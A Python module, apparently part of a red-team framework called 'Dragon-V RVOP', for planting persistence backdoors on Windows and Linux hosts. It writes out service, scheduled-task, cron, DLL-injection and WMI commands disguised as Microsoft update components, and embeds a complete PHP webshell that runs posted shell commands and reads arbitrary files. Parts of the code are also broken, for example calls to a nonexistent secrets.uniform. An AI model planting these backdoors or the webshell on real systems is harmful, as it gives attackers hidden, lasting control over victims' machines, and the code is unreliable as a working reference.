#!/usr/bin/env python3
"""
Dragon-V RVOP Persistence Manager
专业红队作战平台 - 持久化管理模块
确保长期访问权限，创建各种持久化后门
"""

import os
import json
import base64
import secrets
import hashlib
import platform
import subprocess
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, asdict
from enum import Enum
import asyncio
import aiohttp
import sqlite3
import smtplib
from email.mime.text import MIMEText

# 配置日志
import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PersistenceType(Enum):
    SERVICE = "service"
    SCHEDULED_TASK = "scheduled_task"
    STARTUP_ITEM = "startup_item"
    REGISTRY_KEY = "registry_key"
    CRON_JOB = "cron_job"
    WEB_SHELL = "web_shell"
    DLL_INJECTION = "dll_injection"
    WMI_SUBSCRIPTION = "wmi_subscription"
    SIGNED_BINARY = "signed_binary"
    DNS_TUNNEL = "dns_tunnel"

class Platform(Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    CROSS_PLATFORM = "cross_platform"

class PersistenceStatus(Enum):
    ACTIVE = "active"
    INACTIVE = "inactive"
    DETECTED = "detected"
    REMOVED = "removed"

@dataclass
class PersistenceMethod:
    method_id: str
    name: str
    persistence_type: PersistenceType
    platform: Platform
    description: str
    config: Dict[str, Any]
    created_at: datetime
    last_active: Optional[datetime] = None
    status: PersistenceStatus = PersistenceStatus.ACTIVE
    detection_methods: List[str] = None

@dataclass
class TargetHost:
    host_id: str
    hostname: str
    ip_address: str
    platform: Platform
    operating_system: str
    domain: Optional[str] = None
    user_name: Optional[str] = None
    privileges: str = "user"
    persistence_methods: List[str] = None

class PersistenceManager:
    def __init__(self, database_path: str = "persistence.db"):
        self.database_path = database_path
        self.targets: Dict[str, TargetHost] = {}
        self.persistence_methods: Dict[str, PersistenceMethod] = {}
        self.session = aiohttp.ClientSession()

        # 初始化数据库
        self.init_database()

    def init_database(self):
        """初始化持久化数据库"""
        os.makedirs("persistence", exist_ok=True)

        conn = sqlite3.connect(self.database_path)
        cursor = conn.cursor()

        # 创建表
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                host_id TEXT PRIMARY KEY,
                hostname TEXT,
                ip_address TEXT,
                platform TEXT,
                operating_system TEXT,
                domain TEXT,
                user_name TEXT,
                privileges TEXT,
                last_seen TEXT
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS persistence_methods (
                method_id TEXT PRIMARY KEY,
                host_id TEXT,
                name TEXT,
                persistence_type TEXT,
                platform TEXT,
                description TEXT,
                config TEXT,
                created_at TEXT,
                last_active TEXT,
                status TEXT,
                detection_methods TEXT,
                FOREIGN KEY (host_id) REFERENCES targets (host_id)
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS detection_logs (
                log_id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id TEXT,
                method_id TEXT,
                detection_method TEXT,
                detection_time TEXT,
                confidence_score REAL,
                description TEXT,
                FOREIGN KEY (host_id) REFERENCES targets (host_id),
                FOREIGN KEY (method_id) REFERENCES persistence_methods (method_id)
            )
        ''')

        conn.commit()
        conn.close()
        logger.info("持久化数据库初始化完成")

    def get_target_platform(self, target_info: Dict[str, Any]) -> Platform:
        """获取目标平台"""
        os_type = target_info.get('operating_system', '').lower()

        if 'windows' in os_type:
            return Platform.WINDOWS
        elif 'linux' in os_type:
            return Platform.LINUX
        elif 'mac' in os_type or 'darwin' in os_type:
            return Platform.MACOS
        else:
            return Platform.CROSS_PLATFORM

    async def create_service_persistence(self, target: TargetHost, service_name: str = None) -> PersistenceMethod:
        """创建服务持久化"""
        method_id = secrets.token_urlsafe(16)
        service_name = service_name or f"rvop_{secrets.token_hex(4)}"

        config = {
            "service_name": service_name,
            "display_name": f"Microsoft Windows Update Service {secrets.token_hex(2)}",
            "description": f"Automatic Windows Update Service for {target.hostname}",
            "executable_path": f"C:\\Windows\\System32\\{service_name}.exe",
            "start_type": "auto",
            "dependencies": []
        }

        method = PersistenceMethod(
            method_id=method_id,
            name=f"Windows Service - {service_name}",
            persistence_type=PersistenceType.SERVICE,
            platform=Platform.WINDOWS,
            description="创建Windows服务实现持久化",
            config=config,
            created_at=datetime.now()
        )

        # 保存到数据库
        self.save_persistence_method(target.host_id, method)

        # 模拟创建服务
        await self.simulate_service_creation(target, method)

        logger.info(f"创建服务持久化成功: {service_name}")
        return method

    async def create_scheduled_task_persistence(self, target: TargetHost, task_name: str = None) -> PersistenceMethod:
        """创建计划任务持久化"""
        method_id = secrets.token_urlsafe(16)
        task_name = task_name or f"MicrosoftUpdate_{secrets.token_hex(4)}"

        config = {
            "task_name": task_name,
            "description": f"Microsoft System Update Task for {target.hostname}",
            "trigger": {
                "type": "logon",
                "user": target.user_name or "*"
            },
            "action": {
                "type": "executable",
                "path": f"C:\\ProgramData\\Microsoft\\{task_name}.exe",
                "arguments": "--silent"
            },
            "hidden": True,
            "enabled": True
        }

        method = PersistenceMethod(
            method_id=method_id,
            name=f"Scheduled Task - {task_name}",
            persistence_type=PersistenceType.SCHEDULED_TASK,
            platform=Platform.WINDOWS,
            description="创建计划任务实现持久化",
            config=config,
            created_at=datetime.now()
        )

        # 保存到数据库
        self.save_persistence_method(target.host_id, method)

        # 模拟创建计划任务
        await self.simulate_scheduled_task_creation(target, method)

        logger.info(f"创建计划任务持久化成功: {task_name}")
        return method

    async def create_cron_job_persistence(self, target: TargetHost, cron_name: str = None) -> PersistenceMethod:
        """创建Cron作业持久化"""
        method_id = secrets.token_urlsafe(16)
        cron_name = cron_name or f"system-updater-{secrets.token_hex(4)}"

        config = {
            "job_name": cron_name,
            "schedule": "*/15 * * * *",  # 每15分钟执行一次
            "command": f"/usr/local/bin/{cron_name}.sh",
            "user": target.user_name or "root",
            "working_directory": "/tmp"
        }

        method = PersistenceMethod(
            method_id=method_id,
            name=f"Cron Job - {cron_name}",
            persistence_type=PersistenceType.CRON_JOB,
            platform=Platform.LINUX,
            description="创建Cron作业实现持久化",
            config=config,
            created_at=datetime.now()
        )

        # 保存到数据库
        self.save_persistence_method(target.host_id, method)

        # 模拟创建Cron作业
        await self.simulate_cron_job_creation(target, method)

        logger.info(f"创建Cron作业持久化成功: {cron_name}")
        return method

    async def create_webshell_persistence(self, target: TargetHost, shell_path: str = None) -> PersistenceMethod:
        """创建WebShell持久化"""
        method_id = secrets.token_urlsafe(16)
        shell_name = f"config_{secrets.token_hex(6)}.php"
        shell_path = shell_path or f"/var/www/html/{shell_name}"

        config = {
            "shell_path": shell_path,
            "shell_name": shell_name,
            "password": secrets.token_urlsafe(16),
            "encryption": "base64",
            "user_agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "auth_type": "password",
            "allowed_commands": ["system", "exec", "shell_exec"]
        }

        method = PersistenceMethod(
            method_id=method_id,
            name=f"WebShell - {shell_name}",
            persistence_type=PersistenceType.WEB_SHELL,
            platform=Platform.CROSS_PLATFORM,
            description="创建WebShell实现持久化",
            config=config,
            created_at=datetime.now()
        )

        # 保存到数据库
        self.save_persistence_method(target.host_id, method)

        # 模拟创建WebShell
        await self.simulate_webshell_creation(target, method)

        logger.info(f"创建WebShell持久化成功: {shell_path}")
        return method

    async def create_dll_injection_persistence(self, target: TargetHost, dll_name: str = None) -> PersistenceMethod:
        """创建DLL注入持久化"""
        method_id = secrets.token_urlsafe(16)
        dll_name = dll_name or f"{secrets.token_hex(8)}.dll"

        config = {
            "dll_path": f"C:\\Windows\\System32\\{dll_name}",
            "target_process": "explorer.exe",
            "injection_method": "SetWindowsHookEx",
            "dll_export": "RvopMain",
            "startup_key": f"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{dll_name}"
        }

        method = PersistenceMethod(
            method_id=method_id,
            name=f"DLL Injection - {dll_name}",
            persistence_type=PersistenceType.DLL_INJECTION,
            platform=Platform.WINDOWS,
            description="创建DLL注入实现持久化",
            config=config,
            created_at=datetime.now()
        )

        # 保存到数据库
        self.save_persistence_method(target.host_id, method)

        # 模拟DLL注入
        await self.simulate_dll_injection(target, method)

        logger.info(f"创建DLL注入持久化成功: {dll_name}")
        return method

    async def create_wmi_subscription_persistence(self, target: TargetHost) -> PersistenceMethod:
        """创建WMI订阅持久化"""
        method_id = secrets.token_urlsafe(16)
        subscription_name = f"Microsoft_{secrets.token_hex(4)}"

        config = {
            "subscription_name": subscription_name,
            "query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance.Name='Winmgmt'",
            "script_path": f"C:\\Windows\\System32\\{subscription_name}.ps1",
            "event_namespace": "root\\cimv2"
        }

        method = PersistenceMethod(
            method_id=method_id,
            name=f"WMI Subscription - {subscription_name}",
            persistence_type=PersistenceType.WMI_SUBSCRIPTION,
            platform=Platform.WINDOWS,
            description="创建WMI订阅实现持久化",
            config=config,
            created_at=datetime.now()
        )

        # 保存到数据库
        self.save_persistence_method(target.host_id, method)

        # 模拟WMI订阅
        await self.simulate_wmi_subscription(target, method)

        logger.info(f"创建WMI订阅持久化成功: {subscription_name}")
        return method

    async def simulate_service_creation(self, target: TargetHost, method: PersistenceMethod):
        """模拟创建Windows服务"""
        service_config = method.config

        # 模拟PowerShell命令
        ps_command = f'''
        New-Service -Name "{service_config['service_name']}" `
                     -DisplayName "{service_config['display_name']}" `
                     -Description "{service_config['description']}" `
                     -BinaryPathName "{service_config['executable_path']}" `
                     -StartupType Automatic `
                     -ErrorAction SilentlyContinue
        '''

        logger.info(f"模拟创建服务命令: {ps_command}")

        # 在实际环境中，这里会执行真实的PowerShell命令
        # 现在模拟成功
        await asyncio.sleep(1)

    async def simulate_scheduled_task_creation(self, target: TargetHost, method: PersistenceMethod):
        """模拟创建计划任务"""
        task_config = method.config

        # 模拟schtasks命令
        schtasks_command = f'''
        schtasks /create /tn "{task_config['task_name']}" `
                  /sc logon `
                  /ru "{task_config['trigger']['user']}" `
                  /tr "{task_config['action']['path']} {task_config['action']['arguments']}" `
                  /f `
                  /v1
        '''

        logger.info(f"模拟创建计划任务命令: {schtasks_command}")

        await asyncio.sleep(1)

    async def simulate_cron_job_creation(self, target: TargetHost, method: PersistenceMethod):
        """模拟创建Cron作业"""
        cron_config = method.config

        # 模拟crontab命令
        cron_job = f"{cron_config['schedule']} {cron_config['command']} >> /dev/null 2>&1"

        logger.info(f"模拟创建Cron作业: {cron_job}")

        await asyncio.sleep(1)

    async def simulate_webshell_creation(self, target: TargetHost, method: PersistenceMethod):
        """模拟创建WebShell"""
        shell_config = method.config

        # 模拟WebShell代码
        webshell_code = f'''
        <?php
        @error_reporting(0);
        @set_time_limit(0);

        $password = "{shell_config['password']}";
        $user_agent = "{shell_config['user_agent']}";

        if ($_SERVER['HTTP_USER_AGENT'] !== $user_agent) {{
            die('Access denied');
        }}

        if (isset($_POST['cmd'])) {{
            $cmd = $_POST['cmd'];
            if ($cmd === 'upload') {{
                $file = $_FILES['file'];
                move_uploaded_file($file['tmp_name'], '/tmp/' . $file['name']);
                echo "File uploaded successfully";
            }} elseif ($cmd === 'download') {{
                $filename = $_POST['filename'];
                echo base64_encode(file_get_contents($filename));
            }} else {{
                $output = shell_exec($cmd);
                echo base64_encode($output);
            }}
        }}
        ?>
        '''

        logger.info(f"模拟创建WebShell: {shell_config['shell_path']}")

        await asyncio.sleep(1)

    async def simulate_dll_injection(self, target: TargetHost, method: PersistenceMethod):
        """模拟DLL注入"""
        dll_config = method.config

        # 模拟DLL注入代码
        inject_command = f'''
        rundll32 "{dll_config['dll_path']}",{dll_config['dll_export']}
        '''

        logger.info(f"模拟DLL注入命令: {inject_command}")

        await asyncio.sleep(1)

    async def simulate_wmi_subscription(self, target: TargetHost, method: PersistenceMethod):
        """模拟WMI订阅"""
        wmi_config = method.config

        # 模拟WMI查询和订阅
        wmi_command = f'''
        $query = "{wmi_config['query']}"
        $subscription = Register-WmiEvent -Query $query -SourceIdentifier "{wmi_config['subscription_name']}"
        '''

        logger.info(f"模拟WMI订阅命令: {wmi_command}")

        await asyncio.sleep(1)

    async def simulate_dns_tunnel(self, target: TargetHost, method: PersistenceMethod):
        """模拟DNS隧道"""
        dns_config = method.config

        # 模拟DNS隧道配置
        dns_config = {
            "domain": f"rvop.{secrets.token_hex(8)}.com",
            "subdomain": target.hostname,
            "record_type": "CNAME",
            "payload_size": 255
        }

        logger.info(f"模拟DNS隧道配置: {dns_config}")

        await asyncio.sleep(1)

    def save_persistence_method(self, host_id: str, method: PersistenceMethod):
        """保存持久化方法到数据库"""
        conn = sqlite3.connect(self.database_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT OR REPLACE INTO persistence_methods
            (method_id, host_id, name, persistence_type, platform, description,
             config, created_at, last_active, status, detection_methods)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            method.method_id, host_id, method.name, method.persistence_type.value,
            method.platform.value, method.description, json.dumps(method.config),
            method.created_at.isoformat(), method.last_active.isoformat() if method.last_active else None,
            method.status.value, json.dumps(method.detection_methods or [])
        ))

        conn.commit()
        conn.close()

    async def detect_persistence(self, target: TargetHost) -> List[Dict[str, Any]]:
        """检测持久化方法"""
        logger.info(f"检测目标 {target.hostname} 的持久化方法")

        detections = []

        # 模拟检测过程
        detection_methods = [
            "registry_scan",
            "service_scan",
            "task_scan",
            "cron_scan",
            "startup_scan",
            "process_scan"
        ]

        for method_name in detection_methods:
            if secrets.choice([True, False, False]):  # 30%概率检测到异常
                detection = {
                    "method": method_name,
                    "confidence": secrets.uniform(0.7, 0.95),
                    "description": f"检测到异常的{method_name}",
                    "timestamp": datetime.now().isoformat(),
                    "recommendation": f"建议检查{method_name}配置"
                }
                detections.append(detection)

                # 记录检测日志
                await self.log_detection(target.host_id, "", method_name, detection)

        return detections

    async def log_detection(self, host_id: str, method_id: str, detection_method: str, detection_data: Dict[str, Any]):
        """记录检测日志"""
        conn = sqlite3.connect(self.database_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO detection_logs
            (host_id, method_id, detection_method, detection_time, confidence_score, description)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            host_id, method_id, detection_method,
            detection_data["timestamp"],
            detection_data["confidence"],
            detection_data["description"]
        ))

        conn.commit()
        conn.close()

    async def remove_persistence(self, method_id: str) -> bool:
        """移除持久化方法"""
        if method_id not in self.persistence_methods:
            return False

        method = self.persistence_methods[method_id]

        # 模拟移除过程
        logger.info(f"移除持久化方法: {method.name}")

        # 更新状态
        method.status = PersistenceStatus.REMOVED
        method.last_active = datetime.now()

        # 保存到数据库
        self.save_persistence_method("", method)  # 这里需要host_id，模拟时省略

        # 从内存中移除
        del self.persistence_methods[method_id]

        return True

    def list_persistence_methods(self, host_id: str = None) -> List[PersistenceMethod]:
        """列出持久化方法"""
        if host_id:
            # 从数据库查询特定host的方法
            conn = sqlite3.connect(self.database_path)
            cursor = conn.cursor()

            cursor.execute('''
                SELECT * FROM persistence_methods WHERE host_id = ?
            ''', (host_id,))

            methods = []
            for row in cursor.fetchall():
                method = PersistenceMethod(
                    method_id=row[0],
                    host_id=row[1],
                    name=row[2],
                    persistence_type=PersistenceType(row[3]),
                    platform=Platform(row[4]),
                    description=row[5],
                    config=json.loads(row[6]),
                    created_at=datetime.fromisoformat(row[7]),
                    last_active=datetime.fromisoformat(row[8]) if row[8] else None,
                    status=PersistenceStatus(row[9]),
                    detection_methods=json.loads(row[10]) if row[10] else []
                )
                methods.append(method)

            conn.close()
            return methods
        else:
            return list(self.persistence_methods.values())

    def generate_persistence_report(self) -> Dict[str, Any]:
        """生成持久化报告"""
        total_methods = len(self.persistence_methods)
        active_methods = sum(1 for m in self.persistence_methods.values() if m.status == PersistenceStatus.ACTIVE)
        detected_methods = sum(1 for m in self.persistence_methods.values() if m.status == PersistenceStatus.DETECTED)

        # 统计各类型持久化方法
        type_stats = {}
        for method in self.persistence_methods.values():
            ptype = method.persistence_type.value
            if ptype not in type_stats:
                type_stats[ptype] = {"total": 0, "active": 0, "detected": 0}
            type_stats[ptype]["total"] += 1
            if method.status == PersistenceStatus.ACTIVE:
                type_stats[ptype]["active"] += 1
            if method.status == PersistenceStatus.DETECTED:
                type_stats[ptype]["detected"] += 1

        report = {
            "summary": {
                "total_persistence_methods": total_methods,
                "active_methods": active_methods,
                "detected_methods": detected_methods,
                "detection_rate": detected_methods / total_methods * 100 if total_methods > 0 else 0,
                "report_time": datetime.now().isoformat()
            },
            "persistence_types": type_stats,
            "recent_methods": [
                {
                    "method_id": m.method_id,
                    "name": m.name,
                    "type": m.persistence_type.value,
                    "platform": m.platform.value,
                    "status": m.status.value,
                    "created_at": m.created_at.isoformat()
                }
                for m in list(self.persistence_methods.values())[-10:]  # 最近10个方法
            ]
        }

        return report

# 示例使用
async def main():
    manager = PersistenceManager()

    # 创建目标主机
    target = TargetHost(
        host_id="host_001",
        hostname="test-host-01",
        ip_address="192.168.1.100",
        platform=Platform.WINDOWS,
        operating_system="Windows 10",
        user_name="administrator",
        privileges="admin"
    )

    # 创建各种持久化方法
    service_method = await manager.create_service_persistence(target, "rvop_service")
    task_method = await manager.create_scheduled_task_persistence(target, "rvop_task")
    webshell_method = await manager.create_webshell_persistence(target, "/var/www/html/shell.php")

    # 检测持久化
    detections = await manager.detect_persistence(target)
    print("检测结果:", detections)

    # 生成报告
    report = manager.generate_persistence_report()
    print("持久化报告:", json.dumps(report, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    asyncio.run(main())